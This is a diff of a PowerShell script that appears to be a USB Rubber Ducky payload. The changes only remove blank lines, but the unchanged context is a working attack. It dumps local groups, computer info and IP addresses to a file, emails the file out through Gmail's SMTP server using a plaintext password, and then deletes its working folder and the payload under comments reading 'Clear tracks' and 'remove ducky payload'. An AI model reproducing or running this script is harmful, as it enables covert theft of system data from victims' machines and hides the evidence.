@@ -28,7 +28,6 @@ Get-LocalGroup | Out-File -Append $filename
 Get-Computerinfo | Out-File -Append $filename
 Get-NetIPAddress | Out-File -Append $filename
 
-
 # Email results
 $FROM = "<SENDER EMAIL ADDRESS>"
 $PASS = "<SENDER PASSWORD>"
@@ -41,11 +40,9 @@ $ATTACH = '23rtg4t.txt'
 
 Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
 
-
 # Clear tracks
 Set-location 'C:\'
 Remove-Item -Path 'C:\temp\234f23' -Recurse -Force
-
 
 # remove ducky payload
 Remove-Item 2643.ps1
